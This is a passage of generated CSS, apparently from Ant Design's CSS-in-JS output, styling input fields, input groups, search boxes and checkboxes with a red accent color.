    .css-1ymq82w.ant-input-affix-wrapper .ant-input-show-count-suffix {
        color: rgba(0, 0, 0, 0.45);
    }

    .css-1ymq82w.ant-input-affix-wrapper .ant-input-show-count-has-suffix {
        margin-right: 4px;
    }

    .css-1ymq82w.ant-input-affix-wrapper .ant-input-prefix {
        margin-right: 4px;
    }

    .css-1ymq82w.ant-input-affix-wrapper .ant-input-suffix {
        margin-left: 4px;
    }

    .css-1ymq82w.ant-input-affix-wrapper .ant-input-clear-icon {
        margin: 0;
        color: rgba(0, 0, 0, 0.25);
        font-size: 12px;
        vertical-align: -1px;
        cursor: pointer;
        transition: color 0.3s;
    }

    .css-1ymq82w.ant-input-affix-wrapper .ant-input-clear-icon:hover {
        color: rgba(0, 0, 0, 0.45);
    }

    .css-1ymq82w.ant-input-affix-wrapper .ant-input-clear-icon:active {
        color: rgba(0, 0, 0, 0.88);
    }

    .css-1ymq82w.ant-input-affix-wrapper .ant-input-clear-icon-hidden {
        visibility: hidden;
    }

    .css-1ymq82w.ant-input-affix-wrapper .ant-input-clear-icon-has-suffix {
        margin: 0 4px;
    }

    .css-1ymq82w.ant-input-affix-wrapper-textarea-with-clear-btn {
        padding: 0 !important;
        border: 0 !important;
    }

    .css-1ymq82w.ant-input-affix-wrapper-textarea-with-clear-btn .ant-input-clear-icon {
        position: absolute;
        top: 8px;
        right: 8px;
        z-index: 1;
    }

    .css-1ymq82w.ant-input-affix-wrapper .anticon.ant-input-password-icon {
        color: rgba(0, 0, 0, 0.45);
        cursor: pointer;
        transition: all 0.3s;
    }

    .css-1ymq82w.ant-input-affix-wrapper .anticon.ant-input-password-icon:hover {
        color: rgba(0, 0, 0, 0.88);
    }

    .css-1ymq82w.ant-input-affix-wrapper-status-error:not(.css-1ymq82w.ant-input-affix-wrapper-disabled):not(.css-1ymq82w.ant-input-affix-wrapper-borderless).css-1ymq82w.ant-input-affix-wrapper {
        border-color: #ff4d4f;
    }

    .css-1ymq82w.ant-input-affix-wrapper-status-error:not(.css-1ymq82w.ant-input-affix-wrapper-disabled):not(.css-1ymq82w.ant-input-affix-wrapper-borderless).css-1ymq82w.ant-input-affix-wrapper:hover {
        border-color: #ffa39e;
    }

    .css-1ymq82w.ant-input-affix-wrapper-status-error:not(.css-1ymq82w.ant-input-affix-wrapper-disabled):not(.css-1ymq82w.ant-input-affix-wrapper-borderless).css-1ymq82w.ant-input-affix-wrapper:focus,
    .css-1ymq82w.ant-input-affix-wrapper-status-error:not(.css-1ymq82w.ant-input-affix-wrapper-disabled):not(.css-1ymq82w.ant-input-affix-wrapper-borderless).css-1ymq82w.ant-input-affix-wrapper-focused {
        border-color: #ff4d4f;
        box-shadow: 0 0 0 2px rgba(255, 38, 5, 0.06);
        border-right-width: 1px;
        outline: 0;
    }

    .css-1ymq82w.ant-input-affix-wrapper-status-error:not(.css-1ymq82w.ant-input-affix-wrapper-disabled):not(.css-1ymq82w.ant-input-affix-wrapper-borderless).css-1ymq82w.ant-input-affix-wrapper .ant-input-prefix {
        color: #ff4d4f;
    }

    .css-1ymq82w.ant-input-affix-wrapper-status-warning:not(.css-1ymq82w.ant-input-affix-wrapper-disabled):not(.css-1ymq82w.ant-input-affix-wrapper-borderless).css-1ymq82w.ant-input-affix-wrapper {
        border-color: #faad14;
    }

    .css-1ymq82w.ant-input-affix-wrapper-status-warning:not(.css-1ymq82w.ant-input-affix-wrapper-disabled):not(.css-1ymq82w.ant-input-affix-wrapper-borderless).css-1ymq82w.ant-input-affix-wrapper:hover {
        border-color: #ffd666;
    }

    .css-1ymq82w.ant-input-affix-wrapper-status-warning:not(.css-1ymq82w.ant-input-affix-wrapper-disabled):not(.css-1ymq82w.ant-input-affix-wrapper-borderless).css-1ymq82w.ant-input-affix-wrapper:focus,
    .css-1ymq82w.ant-input-affix-wrapper-status-warning:not(.css-1ymq82w.ant-input-affix-wrapper-disabled):not(.css-1ymq82w.ant-input-affix-wrapper-borderless).css-1ymq82w.ant-input-affix-wrapper-focused {
        border-color: #faad14;
        box-shadow: 0 0 0 2px rgba(255, 215, 5, 0.1);
        border-right-width: 1px;
        outline: 0;
    }

    .css-1ymq82w.ant-input-affix-wrapper-status-warning:not(.css-1ymq82w.ant-input-affix-wrapper-disabled):not(.css-1ymq82w.ant-input-affix-wrapper-borderless).css-1ymq82w.ant-input-affix-wrapper .ant-input-prefix {
        color: #faad14;
    }

    .css-1ymq82w.ant-input-group {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
        color: rgba(0, 0, 0, 0.88);
        font-size: 14px;
        line-height: 1.5714285714285714;
        list-style: none;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        position: relative;
        display: table;
        width: 100%;
        border-collapse: separate;
        border-spacing: 0;
    }

    .css-1ymq82w.ant-input-group[class*='col-'] {
        padding-right: 8px;
    }

    .css-1ymq82w.ant-input-group[class*='col-']:last-child {
        padding-right: 0;
    }

    .css-1ymq82w.ant-input-group-lg .ant-input,
    .css-1ymq82w.ant-input-group-lg>.ant-input-group-addon {
        padding: 7px 11px;
        font-size: 16px;
        line-height: 1.5;
        border-radius: 8px;
    }

    .css-1ymq82w.ant-input-group-sm .ant-input,
    .css-1ymq82w.ant-input-group-sm>.ant-input-group-addon {
        padding: 0px 7px;
        border-radius: 4px;
    }

    .css-1ymq82w.ant-input-group-lg .ant-select-single .ant-select-selector {
        height: 40px;
    }

    .css-1ymq82w.ant-input-group-sm .ant-select-single .ant-select-selector {
        height: 24px;
    }

    .css-1ymq82w.ant-input-group>.ant-input {
        display: table-cell;
    }

    .css-1ymq82w.ant-input-group>.ant-input:not(:first-child):not(:last-child) {
        border-radius: 0;
    }

    .css-1ymq82w.ant-input-group .ant-input-group-addon,
    .css-1ymq82w.ant-input-group .ant-input-group-wrap {
        display: table-cell;
        width: 1px;
        white-space: nowrap;
        vertical-align: middle;
    }

    .css-1ymq82w.ant-input-group .ant-input-group-addon:not(:first-child):not(:last-child),
    .css-1ymq82w.ant-input-group .ant-input-group-wrap:not(:first-child):not(:last-child) {
        border-radius: 0;
    }

    .css-1ymq82w.ant-input-group .ant-input-group-wrap>* {
        display: block !important;
    }

    .css-1ymq82w.ant-input-group .ant-input-group-addon {
        position: relative;
        padding: 0 11px;
        color: rgba(0, 0, 0, 0.88);
        font-weight: normal;
        font-size: 14px;
        text-align: center;
        background-color: rgba(0, 0, 0, 0.02);
        border: 1px solid #d9d9d9;
        border-radius: 6px;
        transition: all 0.3s;
        line-height: 1;
    }

    .css-1ymq82w.ant-input-group .ant-input-group-addon .ant-select {
        margin: -5px -11px;
    }

    .css-1ymq82w.ant-input-group .ant-input-group-addon .ant-select.ant-select-single:not(.ant-select-customize-input) .ant-select-selector {
        background-color: inherit;
        border: 1px solid transparent;
        box-shadow: none;
    }

    .css-1ymq82w.ant-input-group .ant-input-group-addon .ant-select-open .ant-select-selector,
    .css-1ymq82w.ant-input-group .ant-input-group-addon .ant-select-focused .ant-select-selector {
        color: #1677ff;
    }

    .css-1ymq82w.ant-input-group .ant-input-group-addon .ant-cascader-picker {
        margin: -9px -11px;
        background-color: transparent;
    }

    .css-1ymq82w.ant-input-group .ant-input-group-addon .ant-cascader-picker .ant-cascader-input {
        text-align: start;
        border: 0;
        box-shadow: none;
    }

    .css-1ymq82w.ant-input-group .ant-input-group-addon:first-child {
        border-right: 0;
    }

    .css-1ymq82w.ant-input-group .ant-input-group-addon:last-child {
        border-left: 0;
    }

    .css-1ymq82w.ant-input-group .ant-input {
        float: inline-start;
        width: 100%;
        margin-bottom: 0;
        text-align: inherit;
    }

    .css-1ymq82w.ant-input-group .ant-input:focus {
        z-index: 1;
        border-right-width: 1px;
    }

    .css-1ymq82w.ant-input-group .ant-input:hover {
        z-index: 1;
        border-right-width: 1px;
    }

    .ant-input-search-with-button .css-1ymq82w.ant-input-group .ant-input:hover {
        z-index: 0;
    }

    .css-1ymq82w.ant-input-group>.ant-input:first-child,
    .css-1ymq82w.ant-input-group .ant-input-group-addon:first-child {
        border-top-right-radius: 0;
        border-bottom-right-radius: 0;
    }

    .css-1ymq82w.ant-input-group>.ant-input:first-child .ant-select .ant-select-selector,
    .css-1ymq82w.ant-input-group .ant-input-group-addon:first-child .ant-select .ant-select-selector {
        border-top-right-radius: 0;
        border-bottom-right-radius: 0;
    }

    .css-1ymq82w.ant-input-group>.ant-input-affix-wrapper:not(:first-child) .ant-input {
        border-top-left-radius: 0;
        border-bottom-left-radius: 0;
    }

    .css-1ymq82w.ant-input-group>.ant-input-affix-wrapper:not(:last-child) .ant-input {
        border-top-right-radius: 0;
        border-bottom-right-radius: 0;
    }

    .css-1ymq82w.ant-input-group>.ant-input:last-child,
    .css-1ymq82w.ant-input-group .ant-input-group-addon:last-child {
        border-top-left-radius: 0;
        border-bottom-left-radius: 0;
    }

    .css-1ymq82w.ant-input-group>.ant-input:last-child .ant-select .ant-select-selector,
    .css-1ymq82w.ant-input-group .ant-input-group-addon:last-child .ant-select .ant-select-selector {
        border-top-left-radius: 0;
        border-bottom-left-radius: 0;
    }

    .css-1ymq82w.ant-input-group .ant-input-affix-wrapper:not(:last-child) {
        border-top-right-radius: 0;
        border-bottom-right-radius: 0;
    }

    .ant-input-search .css-1ymq82w.ant-input-group .ant-input-affix-wrapper:not(:last-child) {
        border-top-left-radius: 6px;
        border-bottom-left-radius: 6px;
    }

    .css-1ymq82w.ant-input-group .ant-input-affix-wrapper:not(:first-child),
    .ant-input-search .css-1ymq82w.ant-input-group .ant-input-affix-wrapper:not(:first-child) {
        border-top-left-radius: 0;
        border-bottom-left-radius: 0;
    }

    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact {
        display: block;
    }

    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact::before {
        display: table;
        content: "";
    }

    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact::after {
        display: table;
        clear: both;
        content: "";
    }

    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact .ant-input-group-addon:not(:first-child):not(:last-child),
    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact .ant-input-group-wrap:not(:first-child):not(:last-child),
    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact>.ant-input:not(:first-child):not(:last-child) {
        border-right-width: 1px;
    }

    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact .ant-input-group-addon:not(:first-child):not(:last-child):hover,
    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact .ant-input-group-wrap:not(:first-child):not(:last-child):hover,
    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact>.ant-input:not(:first-child):not(:last-child):hover {
        z-index: 1;
    }

    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact .ant-input-group-addon:not(:first-child):not(:last-child):focus,
    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact .ant-input-group-wrap:not(:first-child):not(:last-child):focus,
    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact>.ant-input:not(:first-child):not(:last-child):focus {
        z-index: 1;
    }

    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact>* {
        display: inline-block;
        float: none;
        vertical-align: top;
        border-radius: 0;
    }

    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact>.ant-input-affix-wrapper {
        display: inline-flex;
    }

    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact>.ant-picker-range {
        display: inline-flex;
    }

    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact>*:not(:last-child) {
        margin-right: -1px;
        border-right-width: 1px;
    }

    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact .ant-input {
        float: none;
    }

    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact>.ant-select>.ant-select-selector,
    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact>.ant-select-auto-complete .ant-input,
    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact>.ant-cascader-picker .ant-input,
    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact>.ant-input-group-wrapper .ant-input {
        border-right-width: 1px;
        border-radius: 0;
    }

    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact>.ant-select>.ant-select-selector:hover,
    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact>.ant-select-auto-complete .ant-input:hover,
    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact>.ant-cascader-picker .ant-input:hover,
    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact>.ant-input-group-wrapper .ant-input:hover {
        z-index: 1;
    }

    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact>.ant-select>.ant-select-selector:focus,
    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact>.ant-select-auto-complete .ant-input:focus,
    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact>.ant-cascader-picker .ant-input:focus,
    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact>.ant-input-group-wrapper .ant-input:focus {
        z-index: 1;
    }

    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact>.ant-select-focused {
        z-index: 1;
    }

    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact>.ant-select>.ant-select-arrow {
        z-index: 1;
    }

    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact>*:first-child,
    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact>.ant-select:first-child>.ant-select-selector,
    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact>.ant-select-auto-complete:first-child .ant-input,
    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact>.ant-cascader-picker:first-child .ant-input {
        border-top-left-radius: 6px;
        border-bottom-left-radius: 6px;
    }

    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact>*:last-child,
    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact>.ant-select:last-child>.ant-select-selector,
    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact>.ant-cascader-picker:last-child .ant-input,
    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact>.ant-cascader-picker-focused:last-child .ant-input {
        border-right-width: 1px;
        border-top-right-radius: 6px;
        border-bottom-right-radius: 6px;
    }

    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact>.ant-select-auto-complete .ant-input {
        vertical-align: top;
    }

    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact .ant-input-group-wrapper+.ant-input-group-wrapper {
        margin-left: -1px;
    }

    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact .ant-input-group-wrapper+.ant-input-group-wrapper .ant-input-affix-wrapper {
        border-radius: 0;
    }

    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact .ant-input-group-wrapper:not(:last-child).ant-input-search>.ant-input-group>.ant-input-group-addon>.ant-input-search-button {
        border-radius: 0;
    }

    .css-1ymq82w.ant-input-group.css-1ymq82w.ant-input-group-compact .ant-input-group-wrapper:not(:last-child).ant-input-search>.ant-input-group>.ant-input {
        border-top-left-radius: 6px;
        border-top-right-radius: 0;
        border-bottom-right-radius: 0;
        border-bottom-left-radius: 6px;
    }

    .css-1ymq82w.ant-input-group-rtl {
        direction: rtl;
    }

    .css-1ymq82w.ant-input-group-wrapper {
        display: inline-block;
        width: 100%;
        text-align: start;
        vertical-align: top;
    }

    .css-1ymq82w.ant-input-group-wrapper-rtl {
        direction: rtl;
    }

    .css-1ymq82w.ant-input-group-wrapper-lg .ant-input-group-addon {
        border-radius: 8px;
    }

    .css-1ymq82w.ant-input-group-wrapper-sm .ant-input-group-addon {
        border-radius: 4px;
    }

    .css-1ymq82w.ant-input-group-wrapper-status-error .ant-input-group-addon {
        color: #ff4d4f;
        border-color: #ff4d4f;
    }

    .css-1ymq82w.ant-input-group-wrapper-status-warning .ant-input-group-addon:last-child {
        color: #52c41a;
        border-color: #52c41a;
    }

    .css-1ymq82w.ant-input-search .ant-input:hover,
    .css-1ymq82w.ant-input-search .ant-input:focus {
        border-color: #4096ff;
    }

    .css-1ymq82w.ant-input-search .ant-input:hover+.ant-input-group-addon .ant-input-search-button:not(.ant-btn-primary),
    .css-1ymq82w.ant-input-search .ant-input:focus+.ant-input-group-addon .ant-input-search-button:not(.ant-btn-primary) {
        border-left-color: #4096ff;
    }

    .css-1ymq82w.ant-input-search .ant-input-affix-wrapper {
        border-radius: 0;
    }

    .css-1ymq82w.ant-input-search .ant-input-lg {
        line-height: 1.4998;
    }

    .css-1ymq82w.ant-input-search>.ant-input-group>.ant-input-group-addon:last-child {
        left: -1px;
        padding: 0;
        border: 0;
    }

    .css-1ymq82w.ant-input-search>.ant-input-group>.ant-input-group-addon:last-child .ant-input-search-button {
        padding-top: 0;
        padding-bottom: 0;
        border-top-left-radius: 0;
        border-top-right-radius: 6px;
        border-bottom-right-radius: 6px;
        border-bottom-left-radius: 0;
    }

    .css-1ymq82w.ant-input-search>.ant-input-group>.ant-input-group-addon:last-child .ant-input-search-button:not(.ant-btn-primary) {
        color: rgba(0, 0, 0, 0.45);
    }

    .css-1ymq82w.ant-input-search>.ant-input-group>.ant-input-group-addon:last-child .ant-input-search-button:not(.ant-btn-primary):hover {
        color: #4096ff;
    }

    .css-1ymq82w.ant-input-search>.ant-input-group>.ant-input-group-addon:last-child .ant-input-search-button:not(.ant-btn-primary):active {
        color: #0958d9;
    }

    .css-1ymq82w.ant-input-search>.ant-input-group>.ant-input-group-addon:last-child .ant-input-search-button:not(.ant-btn-primary).ant-btn-loading::before {
        left: 0;
        right: 0;
        top: 0;
        bottom: 0;
    }

    .css-1ymq82w.ant-input-search .ant-input-search-button {
        height: 32px;
    }

    .css-1ymq82w.ant-input-search .ant-input-search-button:hover,
    .css-1ymq82w.ant-input-search .ant-input-search-button:focus {
        z-index: 1;
    }

    .css-1ymq82w.ant-input-search-large .ant-input-search-button {
        height: 40px;
    }

    .css-1ymq82w.ant-input-search-small .ant-input-search-button {
        height: 24px;
    }

    .css-1ymq82w.ant-input-search-rtl {
        direction: rtl;
    }

    .css-1ymq82w.ant-input-search.ant-input-compact-item:not(.ant-input-compact-last-item) .ant-input-group-addon .ant-input-search-button {
        margin-right: -1px;
        border-radius: 0;
    }

    .css-1ymq82w.ant-input-search.ant-input-compact-item:not(.ant-input-compact-first-item) .ant-input,
    .css-1ymq82w.ant-input-search.ant-input-compact-item:not(.ant-input-compact-first-item) .ant-input-affix-wrapper {
        border-radius: 0;
    }

    .css-1ymq82w.ant-input-search.ant-input-compact-item>.ant-input-group-addon .ant-input-search-button:hover,
    .css-1ymq82w.ant-input-search.ant-input-compact-item>.ant-input:hover,
    .css-1ymq82w.ant-input-search.ant-input-compact-item .ant-input-affix-wrapper:hover,
    .css-1ymq82w.ant-input-search.ant-input-compact-item>.ant-input-group-addon .ant-input-search-button:focus,
    .css-1ymq82w.ant-input-search.ant-input-compact-item>.ant-input:focus,
    .css-1ymq82w.ant-input-search.ant-input-compact-item .ant-input-affix-wrapper:focus,
    .css-1ymq82w.ant-input-search.ant-input-compact-item>.ant-input-group-addon .ant-input-search-button:active,
    .css-1ymq82w.ant-input-search.ant-input-compact-item>.ant-input:active,
    .css-1ymq82w.ant-input-search.ant-input-compact-item .ant-input-affix-wrapper:active {
        z-index: 2;
    }

    .css-1ymq82w.ant-input-search.ant-input-compact-item>.ant-input-affix-wrapper-focused {
        z-index: 2;
    }

    .css-1ymq82w.ant-input-compact-item:not(.css-1ymq82w.ant-input-compact-last-item) {
        margin-right: -1px;
    }

    .css-1ymq82w.ant-input-compact-item:hover,
    .css-1ymq82w.ant-input-compact-item:focus,
    .css-1ymq82w.ant-input-compact-item:active {
        z-index: 2;
    }

    .css-1ymq82w.ant-input-compact-item[disabled] {
        z-index: 0;
    }

    .css-1ymq82w.ant-input-compact-item:not(.css-1ymq82w.ant-input-compact-first-item):not(.css-1ymq82w.ant-input-compact-last-item) {
        border-radius: 0;
    }

    .css-1ymq82w.ant-input-compact-item:not(.css-1ymq82w.ant-input-compact-last-item).css-1ymq82w.ant-input-compact-first-item,
    .css-1ymq82w.ant-input-compact-item:not(.css-1ymq82w.ant-input-compact-last-item).css-1ymq82w.ant-input-compact-first-item.ant-input-sm,
    .css-1ymq82w.ant-input-compact-item:not(.css-1ymq82w.ant-input-compact-last-item).css-1ymq82w.ant-input-compact-first-item.ant-input-lg {
        border-top-right-radius: 0;
        border-bottom-right-radius: 0;
    }

    .css-1ymq82w.ant-input-compact-item:not(.css-1ymq82w.ant-input-compact-first-item).css-1ymq82w.ant-input-compact-last-item,
    .css-1ymq82w.ant-input-compact-item:not(.css-1ymq82w.ant-input-compact-first-item).css-1ymq82w.ant-input-compact-last-item.ant-input-sm,
    .css-1ymq82w.ant-input-compact-item:not(.css-1ymq82w.ant-input-compact-first-item).css-1ymq82w.ant-input-compact-last-item.ant-input-lg {
        border-top-left-radius: 0;
        border-bottom-left-radius: 0;
    }
</style>
<style>
    .css-1ymq82w[class^="ant-checkbox"],
    .css-1ymq82w[class*=" ant-checkbox"] {
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        font-size: 14px;
        box-sizing: border-box;
    }

    .css-1ymq82w[class^="ant-checkbox"]::before,
    .css-1ymq82w[class*=" ant-checkbox"]::before,
    .css-1ymq82w[class^="ant-checkbox"]::after,
    .css-1ymq82w[class*=" ant-checkbox"]::after {
        box-sizing: border-box;
    }

    .css-1ymq82w[class^="ant-checkbox"] [class^="ant-checkbox"],
    .css-1ymq82w[class*=" ant-checkbox"] [class^="ant-checkbox"],
    .css-1ymq82w[class^="ant-checkbox"] [class*=" ant-checkbox"],
    .css-1ymq82w[class*=" ant-checkbox"] [class*=" ant-checkbox"] {
        box-sizing: border-box;
    }

    .css-1ymq82w[class^="ant-checkbox"] [class^="ant-checkbox"]::before,
    .css-1ymq82w[class*=" ant-checkbox"] [class^="ant-checkbox"]::before,
    .css-1ymq82w[class^="ant-checkbox"] [class*=" ant-checkbox"]::before,
    .css-1ymq82w[class*=" ant-checkbox"] [class*=" ant-checkbox"]::before,
    .css-1ymq82w[class^="ant-checkbox"] [class^="ant-checkbox"]::after,
    .css-1ymq82w[class*=" ant-checkbox"] [class^="ant-checkbox"]::after,
    .css-1ymq82w[class^="ant-checkbox"] [class*=" ant-checkbox"]::after,
    .css-1ymq82w[class*=" ant-checkbox"] [class*=" ant-checkbox"]::after {
        box-sizing: border-box;
    }

    .css-1ymq82w.ant-checkbox-group {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
        color: rgba(0, 0, 0, 0.88);
        font-size: 14px;
        line-height: 1.5714285714285714;
        list-style: none;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        display: inline-flex;
    }

    .css-1ymq82w.ant-checkbox-wrapper {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
        color: rgba(0, 0, 0, 0.88);
        font-size: 14px;
        line-height: unset;
        list-style: none;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        display: inline-flex;
        align-items: baseline;
        cursor: pointer;
    }

    .css-1ymq82w.ant-checkbox-wrapper:after {
        display: inline-block;
        width: 0;
        overflow: hidden;
        content: '\a0';
    }

    .css-1ymq82w.ant-checkbox-wrapper+.css-1ymq82w.ant-checkbox-wrapper {
        margin-left: 8px;
    }

    .css-1ymq82w.ant-checkbox-wrapper.css-1ymq82w.ant-checkbox-wrapper-in-form-item input[type="checkbox"] {
        width: 14px;
        height: 14px;
    }

    .css-1ymq82w.ant-checkbox {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
        color: rgba(0, 0, 0, 0.88);
        font-size: 14px;
        line-height: 1;
        list-style: none;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        top: 0.2em;
        position: relative;
        white-space: nowrap;
        cursor: pointer;
    }

    .css-1ymq82w.ant-checkbox .ant-checkbox-input {
        position: absolute;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
        z-index: 1;
        width: 100%;
        height: 100%;
        cursor: pointer;
        opacity: 0;
    }

    .css-1ymq82w.ant-checkbox .ant-checkbox-input:focus-visible+.ant-checkbox-inner {
        outline: 4px solid #91caff;
        outline-offset: 1px;
        transition: outline-offset 0s, outline 0s;
    }

    .css-1ymq82w.ant-checkbox .ant-checkbox-inner {
        box-sizing: border-box;
        position: relative;
        top: 0;
        left: 0;
        display: block;
        width: 16px;
        height: 16px;
        direction: ltr;
        background-color: #ffffff;
        border: 1px solid #d9d9d9;
        border-radius: 4px;
        border-collapse: separate;
        transition: all 0.3s;
    }

    .css-1ymq82w.ant-checkbox .ant-checkbox-inner:after {
        box-sizing: border-box;
        position: absolute;
        top: 50%;
        left: 21.5%;
        display: table;
        width: 5.7142857142857135px;
        height: 9.142857142857142px;
        border: 2px solid #fff;
        border-top: 0;
        border-left: 0;
        transform: rotate(45deg) scale(0) translate(-50%, -50%);
        opacity: 0;
        content: "";
        transition: all 0.1s cubic-bezier(0.71, -0.46, 0.88, 0.6), opacity 0.1s;
    }

    .css-1ymq82w.ant-checkbox+span {
        padding-left: 8px;
        padding-right: 8px;
    }

    .css-1ymq82w.ant-checkbox-indeterminate .ant-checkbox-inner:after {
        top: 50%;
        left: 50%;
        width: 8px;
        height: 8px;
        background-color: #EF4944;
        border: 0;
        transform: translate(-50%, -50%) scale(1);
        opacity: 1;
        content: "";
    }

    .css-1ymq82w.ant-checkbox-wrapper:hover .ant-checkbox:after {
        visibility: visible;
    }

    .css-1ymq82w.ant-checkbox-wrapper:not(.ant-checkbox-wrapper-disabled):hover .ant-checkbox-inner,
    .css-1ymq82w.ant-checkbox:not(.ant-checkbox-disabled):hover .ant-checkbox-inner {
        border-color: #EF4944;
    }

    .css-1ymq82w.ant-checkbox-wrapper:not(.ant-checkbox-wrapper-disabled):hover .ant-checkbox-checked:not(.ant-checkbox-disabled) .ant-checkbox-inner {
        background-color: #E14844;
        border-color: transparent;
    }

    .css-1ymq82w.ant-checkbox-wrapper:not(.ant-checkbox-wrapper-disabled):hover .ant-checkbox-checked:not(.ant-checkbox-disabled):after {
        border-color: #E14844;
    }

    .css-1ymq82w.ant-checkbox-checked .ant-checkbox-inner {
        background-color: #EF4944;
        border-color: #EF4944;
    }

    .css-1ymq82w.ant-checkbox-checked .ant-checkbox-inner:after {
        opacity: 1;
        transform: rotate(45deg) scale(1) translate(-50%, -50%);
        transition: all 0.2s cubic-bezier(0.12, 0.4, 0.29, 1.46) 0.1s;
    }

    .css-1ymq82w.ant-checkbox-checked:after {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        border-radius: 4px;
        visibility: hidden;
        border: 2px solid #EF4944;
        animation-name: css-1ymq82w-antCheckboxEffect;
        animation-duration: 0.3s;
        animation-timing-function: ease-in-out;
        animation-fill-mode: backwards;
        content: "";
        transition: all 0.3s;
    }

    .css-1ymq82w.ant-checkbox-wrapper-checked:not(.ant-checkbox-wrapper-disabled):hover .ant-checkbox-inner,
    .css-1ymq82w.ant-checkbox-checked:not(.ant-checkbox-disabled):hover .ant-checkbox-inner {
        background-color: #E14844;
        border-color: transparent;
    }

    .css-1ymq82w.ant-checkbox-wrapper-checked:not(.ant-checkbox-wrapper-disabled):hover .ant-checkbox:after,
    .css-1ymq82w.ant-checkbox-checked:not(.ant-checkbox-disabled):hover .ant-checkbox:after {
        border-color: #E14844;
    }

    .css-1ymq82w.ant-checkbox-wrapper-disabled {
        cursor: not-allowed;
    }

    .css-1ymq82w.ant-checkbox-disabled,
    .css-1ymq82w.ant-checkbox-disabled .ant-checkbox-input {
        cursor: not-allowed;
        pointer-events: none;
    }

    .css-1ymq82w.ant-checkbox-disabled .ant-checkbox-inner {
        background: rgba(0, 0, 0, 0.04);
        border-color: #d9d9d9;
    }

    .css-1ymq82w.ant-checkbox-disabled .ant-checkbox-inner:after {
        border-color: rgba(0, 0, 0, 0.25);
    }

    .css-1ymq82w.ant-checkbox-disabled:after {
        display: none;
    }

    .css-1ymq82w.ant-checkbox-disabled+span {
        color: rgba(0, 0, 0, 0.25);
    }

    .css-1ymq82w.ant-checkbox-disabled.ant-checkbox-indeterminate .ant-checkbox-inner::after {
        background: rgba(0, 0, 0, 0.25);
    }
</style>
<style>
    .css-1ymq82w[class^="ant-btn"],
    .css-1ymq82w[class*=" ant-btn"] {
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        font-size: 14px;
        box-sizing: border-box;
    }

